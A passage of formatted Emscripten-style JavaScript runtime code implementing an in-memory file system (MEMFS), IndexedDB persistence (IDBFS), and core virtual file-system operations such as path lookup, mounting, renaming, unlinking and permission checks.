                                            ? ((node.node_ops = MEMFS.ops_table.file.node), (node.stream_ops = MEMFS.ops_table.file.stream), (node.usedBytes = 0), (node.contents = null))
                                            : FS.isLink(node.mode)
                                            ? ((node.node_ops = MEMFS.ops_table.link.node), (node.stream_ops = MEMFS.ops_table.link.stream))
                                            : FS.isChrdev(node.mode) && ((node.node_ops = MEMFS.ops_table.chrdev.node), (node.stream_ops = MEMFS.ops_table.chrdev.stream)),
                                        (node.timestamp = Date.now()),
                                        parent && ((parent.contents[name] = node), (parent.timestamp = node.timestamp)),
                                        node
                                    );
                                },
                                getFileDataAsTypedArray: function (node) {
                                    return node.contents ? (node.contents.subarray ? node.contents.subarray(0, node.usedBytes) : new Uint8Array(node.contents)) : new Uint8Array(0);
                                },
                                expandFileStorage: function (node, newCapacity) {
                                    var prevCapacity = node.contents ? node.contents.length : 0;
                                    if (!(prevCapacity >= newCapacity)) {
                                        (newCapacity = Math.max(newCapacity, (prevCapacity * (prevCapacity < 1048576 ? 2 : 1.125)) >>> 0)), 0 != prevCapacity && (newCapacity = Math.max(newCapacity, 256));
                                        var oldContents = node.contents;
                                        (node.contents = new Uint8Array(newCapacity)), node.usedBytes > 0 && node.contents.set(oldContents.subarray(0, node.usedBytes), 0);
                                    }
                                },
                                resizeFileStorage: function (node, newSize) {
                                    if (node.usedBytes != newSize)
                                        if (0 == newSize) (node.contents = null), (node.usedBytes = 0);
                                        else {
                                            var oldContents = node.contents;
                                            (node.contents = new Uint8Array(newSize)), oldContents && node.contents.set(oldContents.subarray(0, Math.min(newSize, node.usedBytes))), (node.usedBytes = newSize);
                                        }
                                },
                                node_ops: {
                                    getattr: function (node) {
                                        var attr = {};
                                        return (
                                            (attr.dev = FS.isChrdev(node.mode) ? node.id : 1),
                                            (attr.ino = node.id),
                                            (attr.mode = node.mode),
                                            (attr.nlink = 1),
                                            (attr.uid = 0),
                                            (attr.gid = 0),
                                            (attr.rdev = node.rdev),
                                            FS.isDir(node.mode) ? (attr.size = 4096) : FS.isFile(node.mode) ? (attr.size = node.usedBytes) : FS.isLink(node.mode) ? (attr.size = node.link.length) : (attr.size = 0),
                                            (attr.atime = new Date(node.timestamp)),
                                            (attr.mtime = new Date(node.timestamp)),
                                            (attr.ctime = new Date(node.timestamp)),
                                            (attr.blksize = 4096),
                                            (attr.blocks = Math.ceil(attr.size / attr.blksize)),
                                            attr
                                        );
                                    },
                                    setattr: function (node, attr) {
                                        void 0 !== attr.mode && (node.mode = attr.mode), void 0 !== attr.timestamp && (node.timestamp = attr.timestamp), void 0 !== attr.size && MEMFS.resizeFileStorage(node, attr.size);
                                    },
                                    lookup: function (parent, name) {
                                        throw FS.genericErrors[44];
                                    },
                                    mknod: function (parent, name, mode, dev) {
                                        return MEMFS.createNode(parent, name, mode, dev);
                                    },
                                    rename: function (old_node, new_dir, new_name) {
                                        if (FS.isDir(old_node.mode)) {
                                            var new_node;
                                            try {
                                                new_node = FS.lookupNode(new_dir, new_name);
                                            } catch (e) {}
                                            if (new_node) for (var i in new_node.contents) throw new FS.ErrnoError(55);
                                        }
                                        delete old_node.parent.contents[old_node.name],
                                            (old_node.parent.timestamp = Date.now()),
                                            (old_node.name = new_name),
                                            (new_dir.contents[new_name] = old_node),
                                            (new_dir.timestamp = old_node.parent.timestamp),
                                            (old_node.parent = new_dir);
                                    },
                                    unlink: function (parent, name) {
                                        delete parent.contents[name], (parent.timestamp = Date.now());
                                    },
                                    rmdir: function (parent, name) {
                                        var node = FS.lookupNode(parent, name);
                                        for (var i in node.contents) throw new FS.ErrnoError(55);
                                        delete parent.contents[name], (parent.timestamp = Date.now());
                                    },
                                    readdir: function (node) {
                                        var entries = [".", ".."];
                                        for (var key in node.contents) node.contents.hasOwnProperty(key) && entries.push(key);
                                        return entries;
                                    },
                                    symlink: function (parent, newname, oldpath) {
                                        var node = MEMFS.createNode(parent, newname, 41471, 0);
                                        return (node.link = oldpath), node;
                                    },
                                    readlink: function (node) {
                                        if (!FS.isLink(node.mode)) throw new FS.ErrnoError(28);
                                        return node.link;
                                    },
                                },
                                stream_ops: {
                                    read: function (stream, buffer, offset, length, position) {
                                        var contents = stream.node.contents;
                                        if (position >= stream.node.usedBytes) return 0;
                                        var size = Math.min(stream.node.usedBytes - position, length);
                                        if (size > 8 && contents.subarray) buffer.set(contents.subarray(position, position + size), offset);
                                        else for (var i = 0; i < size; i++) buffer[offset + i] = contents[position + i];
                                        return size;
                                    },
                                    write: function (stream, buffer, offset, length, position, canOwn) {
                                        if (!length) return 0;
                                        var node = stream.node;
                                        if (((node.timestamp = Date.now()), buffer.subarray && (!node.contents || node.contents.subarray))) {
                                            if (canOwn) return (node.contents = buffer.subarray(offset, offset + length)), (node.usedBytes = length), length;
                                            if (0 === node.usedBytes && 0 === position) return (node.contents = buffer.slice(offset, offset + length)), (node.usedBytes = length), length;
                                            if (position + length <= node.usedBytes) return node.contents.set(buffer.subarray(offset, offset + length), position), length;
                                        }
                                        if ((MEMFS.expandFileStorage(node, position + length), node.contents.subarray && buffer.subarray)) node.contents.set(buffer.subarray(offset, offset + length), position);
                                        else for (var i = 0; i < length; i++) node.contents[position + i] = buffer[offset + i];
                                        return (node.usedBytes = Math.max(node.usedBytes, position + length)), length;
                                    },
                                    llseek: function (stream, offset, whence) {
                                        var position = offset;
                                        if ((1 === whence ? (position += stream.position) : 2 === whence && FS.isFile(stream.node.mode) && (position += stream.node.usedBytes), position < 0)) throw new FS.ErrnoError(28);
                                        return position;
                                    },
                                    allocate: function (stream, offset, length) {
                                        MEMFS.expandFileStorage(stream.node, offset + length), (stream.node.usedBytes = Math.max(stream.node.usedBytes, offset + length));
                                    },
                                    mmap: function (stream, address, length, position, prot, flags) {
                                        if (0 !== address) throw new FS.ErrnoError(28);
                                        if (!FS.isFile(stream.node.mode)) throw new FS.ErrnoError(43);
                                        var ptr,
                                            allocated,
                                            contents = stream.node.contents;
                                        if (2 & flags || contents.buffer !== buffer) {
                                            if (
                                                ((position > 0 || position + length < contents.length) &&
                                                    (contents = contents.subarray ? contents.subarray(position, position + length) : Array.prototype.slice.call(contents, position, position + length)),
                                                (allocated = !0),
                                                !(ptr = mmapAlloc(length)))
                                            )
                                                throw new FS.ErrnoError(48);
                                            HEAP8.set(contents, ptr);
                                        } else (allocated = !1), (ptr = contents.byteOffset);
                                        return { ptr: ptr, allocated: allocated };
                                    },
                                    msync: function (stream, buffer, offset, length, mmapFlags) {
                                        if (!FS.isFile(stream.node.mode)) throw new FS.ErrnoError(43);
                                        return 2 & mmapFlags || MEMFS.stream_ops.write(stream, buffer, 0, length, offset, !1), 0;
                                    },
                                },
                            },
                            IDBFS = {
                                dbs: {},
                                indexedDB: function () {
                                    if ("undefined" != typeof indexedDB) return indexedDB;
                                    var ret = null;
                                    return "object" == typeof window && (ret = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB), assert(ret, "IDBFS used, but indexedDB not supported"), ret;
                                },
                                DB_VERSION: 21,
                                DB_STORE_NAME: "FILE_DATA",
                                mount: function (mount) {
                                    return MEMFS.mount.apply(null, arguments);
                                },
                                syncfs: function (mount, populate, callback) {
                                    IDBFS.getLocalSet(mount, function (err, local) {
                                        if (err) return callback(err);
                                        IDBFS.getRemoteSet(mount, function (err, remote) {
                                            if (err) return callback(err);
                                            var src = populate ? remote : local,
                                                dst = populate ? local : remote;
                                            IDBFS.reconcile(src, dst, callback);
                                        });
                                    });
                                },
                                getDB: function (name, callback) {
                                    var req,
                                        db = IDBFS.dbs[name];
                                    if (db) return callback(null, db);
                                    try {
                                        req = IDBFS.indexedDB().open(name, IDBFS.DB_VERSION);
                                    } catch (e) {
                                        return callback(e);
                                    }
                                    if (!req) return callback("Unable to connect to IndexedDB");
                                    (req.onupgradeneeded = function (e) {
                                        var fileStore,
                                            db = e.target.result,
                                            transaction = e.target.transaction;
                                        (fileStore = db.objectStoreNames.contains(IDBFS.DB_STORE_NAME) ? transaction.objectStore(IDBFS.DB_STORE_NAME) : db.createObjectStore(IDBFS.DB_STORE_NAME)).indexNames.contains("timestamp") ||
                                            fileStore.createIndex("timestamp", "timestamp", { unique: !1 });
                                    }),
                                        (req.onsuccess = function () {
                                            (db = req.result), (IDBFS.dbs[name] = db), callback(null, db);
                                        }),
                                        (req.onerror = function (e) {
                                            callback(this.error), e.preventDefault();
                                        });
                                },
                                getLocalSet: function (mount, callback) {
                                    var entries = {};
                                    function isRealDir(p) {
                                        return "." !== p && ".." !== p;
                                    }
                                    function toAbsolute(root) {
                                        return function (p) {
                                            return PATH.join2(root, p);
                                        };
                                    }
                                    for (var check = FS.readdir(mount.mountpoint).filter(isRealDir).map(toAbsolute(mount.mountpoint)); check.length; ) {
                                        var stat,
                                            path = check.pop();
                                        try {
                                            stat = FS.stat(path);
                                        } catch (e) {
                                            return callback(e);
                                        }
                                        FS.isDir(stat.mode) && check.push.apply(check, FS.readdir(path).filter(isRealDir).map(toAbsolute(path))), (entries[path] = { timestamp: stat.mtime });
                                    }
                                    return callback(null, { type: "local", entries: entries });
                                },
                                getRemoteSet: function (mount, callback) {
                                    var entries = {};
                                    IDBFS.getDB(mount.mountpoint, function (err, db) {
                                        if (err) return callback(err);
                                        try {
                                            var transaction = db.transaction([IDBFS.DB_STORE_NAME], "readonly");
                                            (transaction.onerror = function (e) {
                                                callback(this.error), e.preventDefault();
                                            }),
                                                (transaction.objectStore(IDBFS.DB_STORE_NAME).index("timestamp").openKeyCursor().onsuccess = function (event) {
                                                    var cursor = event.target.result;
                                                    if (!cursor) return callback(null, { type: "remote", db: db, entries: entries });
                                                    (entries[cursor.primaryKey] = { timestamp: cursor.key }), cursor.continue();
                                                });
                                        } catch (e) {
                                            return callback(e);
                                        }
                                    });
                                },
                                loadLocalEntry: function (path, callback) {
                                    var stat, node;
                                    try {
                                        (node = FS.lookupPath(path).node), (stat = FS.stat(path));
                                    } catch (e) {
                                        return callback(e);
                                    }
                                    return FS.isDir(stat.mode)
                                        ? callback(null, { timestamp: stat.mtime, mode: stat.mode })
                                        : FS.isFile(stat.mode)
                                        ? ((node.contents = MEMFS.getFileDataAsTypedArray(node)), callback(null, { timestamp: stat.mtime, mode: stat.mode, contents: node.contents }))
                                        : callback(new Error("node type not supported"));
                                },
                                storeLocalEntry: function (path, entry, callback) {
                                    try {
                                        if (FS.isDir(entry.mode)) FS.mkdirTree(path, entry.mode);
                                        else {
                                            if (!FS.isFile(entry.mode)) return callback(new Error("node type not supported"));
                                            FS.writeFile(path, entry.contents, { canOwn: !0 });
                                        }
                                        FS.chmod(path, entry.mode), FS.utime(path, entry.timestamp, entry.timestamp);
                                    } catch (e) {
                                        return callback(e);
                                    }
                                    callback(null);
                                },
                                removeLocalEntry: function (path, callback) {
                                    try {
                                        FS.lookupPath(path);
                                        var stat = FS.stat(path);
                                        FS.isDir(stat.mode) ? FS.rmdir(path) : FS.isFile(stat.mode) && FS.unlink(path);
                                    } catch (e) {
                                        return callback(e);
                                    }
                                    callback(null);
                                },
                                loadRemoteEntry: function (store, path, callback) {
                                    var req = store.get(path);
                                    (req.onsuccess = function (event) {
                                        callback(null, event.target.result);
                                    }),
                                        (req.onerror = function (e) {
                                            callback(this.error), e.preventDefault();
                                        });
                                },
                                storeRemoteEntry: function (store, path, entry, callback) {
                                    try {
                                        var req = store.put(entry, path);
                                    } catch (e) {
                                        return void callback(e);
                                    }
                                    (req.onsuccess = function () {
                                        callback(null);
                                    }),
                                        (req.onerror = function (e) {
                                            callback(this.error), e.preventDefault();
                                        });
                                },
                                removeRemoteEntry: function (store, path, callback) {
                                    var req = store.delete(path);
                                    (req.onsuccess = function () {
                                        callback(null);
                                    }),
                                        (req.onerror = function (e) {
                                            callback(this.error), e.preventDefault();
                                        });
                                },
                                reconcile: function (src, dst, callback) {
                                    var total = 0,
                                        create = [];
                                    Object.keys(src.entries).forEach(function (key) {
                                        var e = src.entries[key],
                                            e2 = dst.entries[key];
                                        (e2 && e.timestamp.getTime() == e2.timestamp.getTime()) || (create.push(key), total++);
                                    });
                                    var remove = [];
                                    if (
                                        (Object.keys(dst.entries).forEach(function (key) {
                                            src.entries[key] || (remove.push(key), total++);
                                        }),
                                        !total)
                                    )
                                        return callback(null);
                                    var errored = !1,
                                        transaction = ("remote" === src.type ? src.db : dst.db).transaction([IDBFS.DB_STORE_NAME], "readwrite"),
                                        store = transaction.objectStore(IDBFS.DB_STORE_NAME);
                                    function done(err) {
                                        if (err && !errored) return (errored = !0), callback(err);
                                    }
                                    (transaction.onerror = function (e) {
                                        done(this.error), e.preventDefault();
                                    }),
                                        (transaction.oncomplete = function (e) {
                                            errored || callback(null);
                                        }),
                                        create.sort().forEach(function (path) {
                                            "local" === dst.type
                                                ? IDBFS.loadRemoteEntry(store, path, function (err, entry) {
                                                      if (err) return done(err);
                                                      IDBFS.storeLocalEntry(path, entry, done);
                                                  })
                                                : IDBFS.loadLocalEntry(path, function (err, entry) {
                                                      if (err) return done(err);
                                                      IDBFS.storeRemoteEntry(store, path, entry, done);
                                                  });
                                        }),
                                        remove
                                            .sort()
                                            .reverse()
                                            .forEach(function (path) {
                                                "local" === dst.type ? IDBFS.removeLocalEntry(path, done) : IDBFS.removeRemoteEntry(store, path, done);
                                            });
                                },
                            },
                            FS = {
                                root: null,
                                mounts: [],
                                devices: {},
                                streams: [],
                                nextInode: 1,
                                nameTable: null,
                                currentPath: "/",
                                initialized: !1,
                                ignorePermissions: !0,
                                trackingDelegate: {},
                                tracking: { openFlags: { READ: 1, WRITE: 2 } },
                                ErrnoError: null,
                                genericErrors: {},
                                filesystems: null,
                                syncFSRequests: 0,
                                lookupPath: function (path, opts) {
                                    if (((opts = opts || {}), !(path = PATH_FS.resolve(FS.cwd(), path)))) return { path: "", node: null };
                                    var defaults = { follow_mount: !0, recurse_count: 0 };
                                    for (var key in defaults) void 0 === opts[key] && (opts[key] = defaults[key]);
                                    if (opts.recurse_count > 8) throw new FS.ErrnoError(32);
                                    for (
                                        var parts = PATH.normalizeArray(
                                                path.split("/").filter(function (p) {
                                                    return !!p;
                                                }),
                                                !1
                                            ),
                                            current = FS.root,
                                            current_path = "/",
                                            i = 0;
                                        i < parts.length;
                                        i++
                                    ) {
                                        var islast = i === parts.length - 1;
                                        if (islast && opts.parent) break;
                                        if (
                                            ((current = FS.lookupNode(current, parts[i])),
                                            (current_path = PATH.join2(current_path, parts[i])),
                                            FS.isMountpoint(current) && (!islast || (islast && opts.follow_mount)) && (current = current.mounted.root),
                                            !islast || opts.follow)
                                        )
                                            for (var count = 0; FS.isLink(current.mode); ) {
                                                var link = FS.readlink(current_path);
                                                if (((current_path = PATH_FS.resolve(PATH.dirname(current_path), link)), (current = FS.lookupPath(current_path, { recurse_count: opts.recurse_count }).node), count++ > 40))
                                                    throw new FS.ErrnoError(32);
                                            }
                                    }
                                    return { path: current_path, node: current };
                                },
                                getPath: function (node) {
                                    for (var path; ; ) {
                                        if (FS.isRoot(node)) {
                                            var mount = node.mount.mountpoint;
                                            return path ? ("/" !== mount[mount.length - 1] ? mount + "/" + path : mount + path) : mount;
                                        }
                                        (path = path ? node.name + "/" + path : node.name), (node = node.parent);
                                    }
                                },
                                hashName: function (parentid, name) {
                                    for (var hash = 0, i = 0; i < name.length; i++) hash = ((hash << 5) - hash + name.charCodeAt(i)) | 0;
                                    return ((parentid + hash) >>> 0) % FS.nameTable.length;
                                },
                                hashAddNode: function (node) {
                                    var hash = FS.hashName(node.parent.id, node.name);
                                    (node.name_next = FS.nameTable[hash]), (FS.nameTable[hash] = node);
                                },
                                hashRemoveNode: function (node) {
                                    var hash = FS.hashName(node.parent.id, node.name);
                                    if (FS.nameTable[hash] === node) FS.nameTable[hash] = node.name_next;
                                    else
                                        for (var current = FS.nameTable[hash]; current; ) {
                                            if (current.name_next === node) {
                                                current.name_next = node.name_next;
                                                break;
                                            }
                                            current = current.name_next;
                                        }
                                },
                                lookupNode: function (parent, name) {
                                    var errCode = FS.mayLookup(parent);
                                    if (errCode) throw new FS.ErrnoError(errCode, parent);
                                    for (var hash = FS.hashName(parent.id, name), node = FS.nameTable[hash]; node; node = node.name_next) {
                                        var nodeName = node.name;
                                        if (node.parent.id === parent.id && nodeName === name) return node;
                                    }
                                    return FS.lookup(parent, name);
                                },
                                createNode: function (parent, name, mode, rdev) {
                                    var node = new FS.FSNode(parent, name, mode, rdev);
                                    return FS.hashAddNode(node), node;
                                },
                                destroyNode: function (node) {
                                    FS.hashRemoveNode(node);
                                },
                                isRoot: function (node) {
                                    return node === node.parent;
                                },
                                isMountpoint: function (node) {
                                    return !!node.mounted;
                                },
                                isFile: function (mode) {
                                    return 32768 == (61440 & mode);
                                },
                                isDir: function (mode) {
                                    return 16384 == (61440 & mode);
                                },
                                isLink: function (mode) {
                                    return 40960 == (61440 & mode);
                                },
                                isChrdev: function (mode) {
                                    return 8192 == (61440 & mode);
                                },
                                isBlkdev: function (mode) {
                                    return 24576 == (61440 & mode);
                                },
                                isFIFO: function (mode) {
                                    return 4096 == (61440 & mode);
                                },
                                isSocket: function (mode) {
                                    return 49152 == (49152 & mode);
                                },
                                flagModes: { r: 0, "r+": 2, w: 577, "w+": 578, a: 1089, "a+": 1090 },
                                modeStringToFlags: function (str) {
                                    var flags = FS.flagModes[str];
                                    if (void 0 === flags) throw new Error("Unknown file open mode: " + str);
                                    return flags;
                                },
                                flagsToPermissionString: function (flag) {
                                    var perms = ["r", "w", "rw"][3 & flag];
                                    return 512 & flag && (perms += "w"), perms;
                                },
                                nodePermissions: function (node, perms) {
                                    return FS.ignorePermissions || ((!perms.includes("r") || 292 & node.mode) && (!perms.includes("w") || 146 & node.mode) && (!perms.includes("x") || 73 & node.mode)) ? 0 : 2;
                                },
                                mayLookup: function (dir) {
                                    var errCode = FS.nodePermissions(dir, "x");
                                    return errCode || (dir.node_ops.lookup ? 0 : 2);
                                },
                                mayCreate: function (dir, name) {
                                    try {
                                        return FS.lookupNode(dir, name), 20;
                                    } catch (e) {}
                                    return FS.nodePermissions(dir, "wx");
                                },
                                mayDelete: function (dir, name, isdir) {
                                    var node;
                                    try {
                                        node = FS.lookupNode(dir, name);
                                    } catch (e) {
                                        return e.errno;
                                    }
                                    var errCode = FS.nodePermissions(dir, "wx");
                                    if (errCode) return errCode;
                                    if (isdir) {
                                        if (!FS.isDir(node.mode)) return 54;
                                        if (FS.isRoot(node) || FS.getPath(node) === FS.cwd()) return 10;
                                    } else if (FS.isDir(node.mode)) return 31;
                                    return 0;
                                },
                                mayOpen: function (node, flags) {
                                    return node ? (FS.isLink(node.mode) ? 32 : FS.isDir(node.mode) && ("r" !== FS.flagsToPermissionString(flags) || 512 & flags) ? 31 : FS.nodePermissions(node, FS.flagsToPermissionString(flags))) : 44;
                                },
                                MAX_OPEN_FDS: 4096,
                                nextfd: function (fd_start, fd_end) {
                                    (fd_start = fd_start || 0), (fd_end = fd_end || FS.MAX_OPEN_FDS);
                                    for (var fd = fd_start; fd <= fd_end; fd++) if (!FS.streams[fd]) return fd;
                                    throw new FS.ErrnoError(33);
                                },
                                getStream: function (fd) {
                                    return FS.streams[fd];
                                },
                                createStream: function (stream, fd_start, fd_end) {
                                    FS.FSStream ||
                                        ((FS.FSStream = function () {}),
                                        (FS.FSStream.prototype = {
                                            object: {
                                                get: function () {
                                                    return this.node;
                                                },
                                                set: function (val) {
                                                    this.node = val;
                                                },
                                            },
                                            isRead: {
                                                get: function () {
                                                    return 1 != (2097155 & this.flags);
                                                },
                                            },
                                            isWrite: {
                                                get: function () {
                                                    return 0 != (2097155 & this.flags);
                                                },
                                            },
                                            isAppend: {
                                                get: function () {
                                                    return 1024 & this.flags;
                                                },
                                            },
                                        }));
                                    var newStream = new FS.FSStream();
                                    for (var p in stream) newStream[p] = stream[p];
                                    stream = newStream;
                                    var fd = FS.nextfd(fd_start, fd_end);
                                    return (stream.fd = fd), (FS.streams[fd] = stream), stream;
                                },
                                closeStream: function (fd) {
                                    FS.streams[fd] = null;
                                },
                                chrdev_stream_ops: {
                                    open: function (stream) {
                                        var device = FS.getDevice(stream.node.rdev);
                                        (stream.stream_ops = device.stream_ops), stream.stream_ops.open && stream.stream_ops.open(stream);
                                    },
                                    llseek: function () {
                                        throw new FS.ErrnoError(70);
                                    },
                                },
                                major: function (dev) {
                                    return dev >> 8;
                                },
                                minor: function (dev) {
                                    return 255 & dev;
                                },
                                makedev: function (ma, mi) {
                                    return (ma << 8) | mi;
                                },
                                registerDevice: function (dev, ops) {
                                    FS.devices[dev] = { stream_ops: ops };
                                },
                                getDevice: function (dev) {
                                    return FS.devices[dev];
                                },
                                getMounts: function (mount) {
                                    for (var mounts = [], check = [mount]; check.length; ) {
                                        var m = check.pop();
                                        mounts.push(m), check.push.apply(check, m.mounts);
                                    }
                                    return mounts;
                                },
                                syncfs: function (populate, callback) {
                                    "function" == typeof populate && ((callback = populate), (populate = !1)),
                                        FS.syncFSRequests++,
                                        FS.syncFSRequests > 1 && err("warning: " + FS.syncFSRequests + " FS.syncfs operations in flight at once, probably just doing extra work");
                                    var mounts = FS.getMounts(FS.root.mount),
                                        completed = 0;
                                    function doCallback(errCode) {
                                        return FS.syncFSRequests--, callback(errCode);
                                    }
                                    function done(errCode) {
                                        if (errCode) return done.errored ? void 0 : ((done.errored = !0), doCallback(errCode));
                                        ++completed >= mounts.length && doCallback(null);
                                    }
                                    mounts.forEach(function (mount) {
                                        if (!mount.type.syncfs) return done(null);
                                        mount.type.syncfs(mount, populate, done);
                                    });
                                },
                                mount: function (type, opts, mountpoint) {
                                    var node,
                                        root = "/" === mountpoint,
                                        pseudo = !mountpoint;
                                    if (root && FS.root) throw new FS.ErrnoError(10);
                                    if (!root && !pseudo) {
                                        var lookup = FS.lookupPath(mountpoint, { follow_mount: !1 });
                                        if (((mountpoint = lookup.path), (node = lookup.node), FS.isMountpoint(node))) throw new FS.ErrnoError(10);
                                        if (!FS.isDir(node.mode)) throw new FS.ErrnoError(54);
                                    }
                                    var mount = { type: type, opts: opts, mountpoint: mountpoint, mounts: [] },
                                        mountRoot = type.mount(mount);
                                    return (mountRoot.mount = mount), (mount.root = mountRoot), root ? (FS.root = mountRoot) : node && ((node.mounted = mount), node.mount && node.mount.mounts.push(mount)), mountRoot;
                                },
                                unmount: function (mountpoint) {
                                    var lookup = FS.lookupPath(mountpoint, { follow_mount: !1 });
                                    if (!FS.isMountpoint(lookup.node)) throw new FS.ErrnoError(28);
                                    var node = lookup.node,
                                        mount = node.mounted,
                                        mounts = FS.getMounts(mount);
                                    Object.keys(FS.nameTable).forEach(function (hash) {
                                        for (var current = FS.nameTable[hash]; current; ) {
                                            var next = current.name_next;
                                            mounts.includes(current.mount) && FS.destroyNode(current), (current = next);
                                        }
                                    }),
                                        (node.mounted = null);
                                    var idx = node.mount.mounts.indexOf(mount);
                                    node.mount.mounts.splice(idx, 1);
                                },
                                lookup: function (parent, name) {
                                    return parent.node_ops.lookup(parent, name);
                                },
                                mknod: function (path, mode, dev) {
                                    var parent = FS.lookupPath(path, { parent: !0 }).node,
                                        name = PATH.basename(path);
                                    if (!name || "." === name || ".." === name) throw new FS.ErrnoError(28);
                                    var errCode = FS.mayCreate(parent, name);
                                    if (errCode) throw new FS.ErrnoError(errCode);
                                    if (!parent.node_ops.mknod) throw new FS.ErrnoError(63);
                                    return parent.node_ops.mknod(parent, name, mode, dev);
                                },
                                create: function (path, mode) {
                                    return (mode = void 0 !== mode ? mode : 438), (mode &= 4095), (mode |= 32768), FS.mknod(path, mode, 0);
                                },
                                mkdir: function (path, mode) {
                                    return (mode = void 0 !== mode ? mode : 511), (mode &= 1023), (mode |= 16384), FS.mknod(path, mode, 0);
                                },
                                mkdirTree: function (path, mode) {
                                    for (var dirs = path.split("/"), d = "", i = 0; i < dirs.length; ++i)
                                        if (dirs[i]) {
                                            d += "/" + dirs[i];
                                            try {
                                                FS.mkdir(d, mode);
                                            } catch (e) {
                                                if (20 != e.errno) throw e;
                                            }
                                        }
                                },
                                mkdev: function (path, mode, dev) {
                                    return void 0 === dev && ((dev = mode), (mode = 438)), (mode |= 8192), FS.mknod(path, mode, dev);
                                },
                                symlink: function (oldpath, newpath) {
                                    if (!PATH_FS.resolve(oldpath)) throw new FS.ErrnoError(44);
                                    var parent = FS.lookupPath(newpath, { parent: !0 }).node;
                                    if (!parent) throw new FS.ErrnoError(44);
                                    var newname = PATH.basename(newpath),
                                        errCode = FS.mayCreate(parent, newname);
                                    if (errCode) throw new FS.ErrnoError(errCode);
                                    if (!parent.node_ops.symlink) throw new FS.ErrnoError(63);
                                    return parent.node_ops.symlink(parent, newname, oldpath);
                                },
                                rename: function (old_path, new_path) {
                                    var old_dir,
                                        new_dir,
                                        old_dirname = PATH.dirname(old_path),
                                        new_dirname = PATH.dirname(new_path),
                                        old_name = PATH.basename(old_path),
                                        new_name = PATH.basename(new_path);
                                    if (((old_dir = FS.lookupPath(old_path, { parent: !0 }).node), (new_dir = FS.lookupPath(new_path, { parent: !0 }).node), !old_dir || !new_dir)) throw new FS.ErrnoError(44);
                                    if (old_dir.mount !== new_dir.mount) throw new FS.ErrnoError(75);
                                    var new_node,
                                        old_node = FS.lookupNode(old_dir, old_name),
                                        relative = PATH_FS.relative(old_path, new_dirname);
                                    if ("." !== relative.charAt(0)) throw new FS.ErrnoError(28);
                                    if ("." !== (relative = PATH_FS.relative(new_path, old_dirname)).charAt(0)) throw new FS.ErrnoError(55);
                                    try {
                                        new_node = FS.lookupNode(new_dir, new_name);
                                    } catch (e) {}
                                    if (old_node !== new_node) {
                                        var isdir = FS.isDir(old_node.mode),
                                            errCode = FS.mayDelete(old_dir, old_name, isdir);
                                        if (errCode) throw new FS.ErrnoError(errCode);
                                        if ((errCode = new_node ? FS.mayDelete(new_dir, new_name, isdir) : FS.mayCreate(new_dir, new_name))) throw new FS.ErrnoError(errCode);
                                        if (!old_dir.node_ops.rename) throw new FS.ErrnoError(63);
                                        if (FS.isMountpoint(old_node) || (new_node && FS.isMountpoint(new_node))) throw new FS.ErrnoError(10);
                                        if (new_dir !== old_dir && (errCode = FS.nodePermissions(old_dir, "w"))) throw new FS.ErrnoError(errCode);
                                        try {
                                            FS.trackingDelegate.willMovePath && FS.trackingDelegate.willMovePath(old_path, new_path);
                                        } catch (e) {
                                            err("FS.trackingDelegate['willMovePath']('" + old_path + "', '" + new_path + "') threw an exception: " + e.message);
                                        }
                                        FS.hashRemoveNode(old_node);
                                        try {
                                            old_dir.node_ops.rename(old_node, new_dir, new_name);
                                        } catch (e) {
                                            throw e;
                                        } finally {
                                            FS.hashAddNode(old_node);
                                        }
                                        try {
                                            FS.trackingDelegate.onMovePath && FS.trackingDelegate.onMovePath(old_path, new_path);
                                        } catch (e) {
                                            err("FS.trackingDelegate['onMovePath']('" + old_path + "', '" + new_path + "') threw an exception: " + e.message);
                                        }
                                    }
                                },
                                rmdir: function (path) {
                                    var parent = FS.lookupPath(path, { parent: !0 }).node,
                                        name = PATH.basename(path),
                                        node = FS.lookupNode(parent, name),
                                        errCode = FS.mayDelete(parent, name, !0);
                                    if (errCode) throw new FS.ErrnoError(errCode);
                                    if (!parent.node_ops.rmdir) throw new FS.ErrnoError(63);
                                    if (FS.isMountpoint(node)) throw new FS.ErrnoError(10);
                                    try {
                                        FS.trackingDelegate.willDeletePath && FS.trackingDelegate.willDeletePath(path);
                                    } catch (e) {
                                        err("FS.trackingDelegate['willDeletePath']('" + path + "') threw an exception: " + e.message);
                                    }
                                    parent.node_ops.rmdir(parent, name), FS.destroyNode(node);
                                    try {
                                        FS.trackingDelegate.onDeletePath && FS.trackingDelegate.onDeletePath(path);
                                    } catch (e) {
                                        err("FS.trackingDelegate['onDeletePath']('" + path + "') threw an exception: " + e.message);
                                    }
                                },
                                readdir: function (path) {
                                    var node = FS.lookupPath(path, { follow: !0 }).node;
                                    if (!node.node_ops.readdir) throw new FS.ErrnoError(54);
                                    return node.node_ops.readdir(node);
                                },
                                unlink: function (path) {
                                    var parent = FS.lookupPath(path, { parent: !0 }).node,
                                        name = PATH.basename(path),
                                        node = FS.lookupNode(parent, name),
                                        errCode = FS.mayDelete(parent, name, !1);
                                    if (errCode) throw new FS.ErrnoError(errCode);
                                    if (!parent.node_ops.unlink) throw new FS.ErrnoError(63);
                                    if (FS.isMountpoint(node)) throw new FS.ErrnoError(10);
                                    try {
                                        FS.trackingDelegate.willDeletePath && FS.trackingDelegate.willDeletePath(path);
                                    } catch (e) {
                                        err("FS.trackingDelegate['willDeletePath']('" + path + "') threw an exception: " + e.message);
                                    }
                                    parent.node_ops.unlink(parent, name), FS.destroyNode(node);
                                    try {
                                        FS.trackingDelegate.onDeletePath && FS.trackingDelegate.onDeletePath(path);
                                    } catch (e) {
                                        err("FS.trackingDelegate['onDeletePath']('" + path + "') threw an exception: " + e.message);
                                    }
                                },
                                readlink: function (path) {
                                    var link = FS.lookupPath(path).node;
                                    if (!link) throw new FS.ErrnoError(44);
                                    if (!link.node_ops.readlink) throw new FS.ErrnoError(28);
                                    return PATH_FS.resolve(FS.getPath(link.parent), link.node_ops.readlink(link));
                                },
                                stat: function (path, dontFollow) {
                                    var node = FS.lookupPath(path, { follow: !dontFollow }).node;
                                    if (!node) throw new FS.ErrnoError(44);
                                    if (!node.node_ops.getattr) throw new FS.ErrnoError(63);
                                    return node.node_ops.getattr(node);
                                },
                                lstat: function (path) {
                                    return FS.stat(path, !0);
                                },
                                chmod: function (path, mode, dontFollow) {
                                    var node;
                                    if (!(node = "string" == typeof path ? FS.lookupPath(path, { follow: !dontFollow }).node : path).node_ops.setattr) throw new FS.ErrnoError(63);
                                    node.node_ops.setattr(node, { mode: (4095 & mode) | (-4096 & node.mode), timestamp: Date.now() });
                                },
